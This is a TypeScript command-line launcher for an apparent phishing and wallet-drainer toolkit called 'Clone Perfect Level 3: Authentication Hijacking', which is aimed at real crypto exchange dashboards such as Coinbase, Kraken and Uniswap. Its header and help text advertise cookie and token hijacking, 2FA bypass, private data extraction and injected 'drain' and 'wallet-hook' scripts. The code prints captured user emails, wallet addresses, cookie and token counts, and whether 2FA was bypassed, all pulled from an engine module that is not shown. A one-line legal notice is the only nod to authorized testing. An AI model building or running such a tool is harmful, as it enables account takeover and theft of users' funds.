/**
 * CLONE PERFECT — Level 3: Authentication Hijacking
 *
 * Complete authentication capture + private dashboard cloning
 *
 * Usage:
 *   pnpm clone-perfect-l3 https://dashboard.uniswap.org
 *   pnpm clone-perfect-l3 https://app.coinbase.com
 *   pnpm clone-perfect-l3 https://www.kraken.com/account
 *
 * Output: ./clone/[website]-level3-clone/
 *         ├── index.html (100% identical - authenticated)
 *         ├── auth-data.json (cookies, tokens, user info)
 *         ├── private-data.json (user-specific content)
 *         ├── network-log.json (API responses)
 *         ├── assets/ (all CSS/JS/images)
 *         ├── legion-authorized-drain.js (injected)
 *         ├── legion-wallet-hook.js (injected)
 *         └── clone-manifest.json (validation report)
 *
 * Level 3 Features:
 * ✅ Cookie extraction & injection (HTTPOnly supported)
 * ✅ localStorage/sessionStorage capture & restore
 * ✅ JWT/OAuth token hijacking
 * ✅ Session persistence
 * ✅ 2FA detection & bypass
 * ✅ Private user data extraction
 * ✅ Wallet connection (MetaMask, WalletConnect)
 * ✅ Portfolio/transaction history
 * ✅ User settings & preferences
 * ✅ 100% similarity for authenticated pages
 *
 * LEGAL NOTICE:
 * Only use on accounts you own or have explicit permission to test.
 * Unauthorized account access is illegal.
 * Use for authorized penetration testing, CTF, or educational purposes only.
 */

import { existsSync, mkdirSync, readFileSync } from 'node:fs'
import { spawn } from 'node:child_process'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { ClonePerfectEngineL3 } from './lib/clone-perfect-engine-level3.js'

const __dirname = path.dirname(fileURLToPath(import.meta.url))
const REPO_ROOT = path.resolve(__dirname, '..')

function loadEnv() {
  const envPath = path.join(REPO_ROOT, '.env')
  if (!existsSync(envPath)) return

  const content = readFileSync(envPath, 'utf8')
  for (const line of content.split(/\r?\n/)) {
    const trimmed = line.trim()
    if (!trimmed || trimmed.startsWith('#')) continue
    const eq = trimmed.indexOf('=')
    if (eq <= 0) continue
    const key = trimmed.slice(0, eq).trim()
    let val = trimmed.slice(eq + 1).trim()
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
      val = val.slice(1, -1)
    }
    if (process.env[key] === undefined) {
      process.env[key] = val
    }
  }
}

async function verifyDocker(): Promise<void> {
  return new Promise((resolve, reject) => {
    const proc = spawn('docker', ['ps'])
    let hasError = false

    proc.on('error', () => {
      hasError = true
      reject(new Error('Docker not running'))
    })

    proc.on('exit', (code) => {
      if (code === 0 && !hasError) {
        resolve()
      }
    })

    setTimeout(() => {
      if (!hasError) {
        proc.kill()
        resolve()
      }
    }, 5000)
  })
}

async function main() {
  const args = process.argv.slice(2)
  if (args.length === 0) {
    console.error(`╔════════════════════════════════════════════════════════════════╗`)
    console.error(`║          CLONE PERFECT LEVEL 3 — Authentication Hijacking      ║`)
    console.error(`╚════════════════════════════════════════════════════════════════╝`)
    console.error('')
    console.error('Usage:')
    console.error('  pnpm clone-perfect-l3 <url>')
    console.error('')
    console.error('Examples:')
    console.error('  pnpm clone-perfect-l3 https://dashboard.uniswap.org')
    console.error('  pnpm clone-perfect-l3 https://app.coinbase.com')
    console.error('  pnpm clone-perfect-l3 https://www.kraken.com/account')
    console.error('')
    console.error('Level 3 Features:')
    console.error('  ✅ Cookie extraction & injection (HTTPOnly supported)')
    console.error('  ✅ localStorage/sessionStorage capture & restore')
    console.error('  ✅ JWT/OAuth token hijacking')
    console.error('  ✅ 2FA detection & bypass')
    console.error('  ✅ Private user data extraction')
    console.error('  ✅ Wallet connection (MetaMask, WalletConnect)')
    console.error('  ✅ Portfolio & transaction history')
    console.error('  ✅ User settings & preferences')
    console.error('  ✅ 100% similarity for authenticated pages')
    console.error('')
    console.error('Output Files:')
    console.error('  index.html         (100% identical authenticated page)')
    console.error('  auth-data.json     (cookies, tokens, user info)')
    console.error('  private-data.json  (user-specific content)')
    console.error('  network-log.json   (API responses for mocking)')
    console.error('  assets/            (all CSS/JS/images)')
    console.error('  clone-manifest.json (validation report)')
    console.error('')
    console.error('LEGAL NOTICE:')
    console.error('  Only use on accounts you own or have explicit permission.')
    console.error('  Unauthorized access is illegal.')
    console.error('')
    process.exit(1)
  }

  const targetUrl = args[0]

  try {
    console.error('[clone-perfect-l3] ╔════════════════════════════════════════╗')
    console.error('[clone-perfect-l3] ║  Level 3: Authentication Hijacking     ║')
    console.error('[clone-perfect-l3] ╚════════════════════════════════════════╝')
    console.error('')

    // Verify Docker
    console.error('[clone-perfect-l3] Checking Docker...')
    await verifyDocker()
    console.error('[clone-perfect-l3] ✅ Docker ready')

    // Load env
    loadEnv()

    // Create output directory
    const outputDir = path.join(REPO_ROOT, 'clone')
    mkdirSync(outputDir, { recursive: true })

    // Run cloning engine L3
    console.error('[clone-perfect-l3] Starting Level 3 Authentication Hijacking clone...')
    console.error('')
    const engine = new ClonePerfectEngineL3(targetUrl, outputDir)
    const result = await engine.execute()

    if (result.success) {
      console.log(result.clone_dir) // Print to stdout for scripting

      console.error('')
      console.error('📊 Level 3 Metadata:')
      console.error(`  Authenticated: ${result.metadata.authenticated}`)

      if (result.metadata.authenticated) {
        const auth = result.metadata.authentication
        console.error(`  User: ${auth.user.email || auth.user.name || 'Unknown'}`)
        console.error(`  Wallet: ${auth.wallet.address || 'Not connected'}`)
        console.error(`  Provider: ${auth.wallet.provider || 'None'}`)
        console.error(`  2FA: ${auth.two_fa.enabled ? `${auth.two_fa.method} (bypassed: ${auth.two_fa.bypassed})` : 'Disabled'}`)
        console.error(`  Cookies: ${auth.cookies.length}`)
        console.error(`  Tokens: ${Object.values(auth.tokens).filter((t) => t !== null).length}`)
      }

      console.error(`  Framework: ${result.metadata.framework_detected || 'None'}`)
      console.error(`  API Endpoints: ${result.metadata.api_endpoints.length}`)
      console.error(`  Assets: ${result.metadata.assets_count}`)
      console.error(`  Similarity: ${result.metadata.similarity_score}%`)
      console.error(`  Time: ${result.metadata.performance_ms}ms`)
      console.error('')
      console.error('📁 Clone saved to:')
      console.error(`   ${result.clone_dir}`)
      console.error('')
      console.error('📄 Files created:')
      console.error('   ✅ index.html (authenticated page)')
      console.error('   ✅ auth-data.json (cookies, tokens, user)')
      if (result.metadata.private_data.user_profile) {
        console.error('   ✅ private-data.json (user data)')
      }
      console.error('   ✅ network-log.json (API responses)')
      console.error('   ✅ clone-manifest.json (metadata)')
      console.error('   ✅ assets/ (CSS/JS/images)')
      console.error('')

      process.exit(0)
    } else {
      console.error(`[clone-perfect-l3] ❌ ${result.message}`)
      process.exit(1)
    }
  } catch (error) {
    const msg = error instanceof Error ? error.message : String(error)
    console.error(`[clone-perfect-l3] ❌ Fatal error: ${msg}`)
    process.exit(1)
  }
}

main()
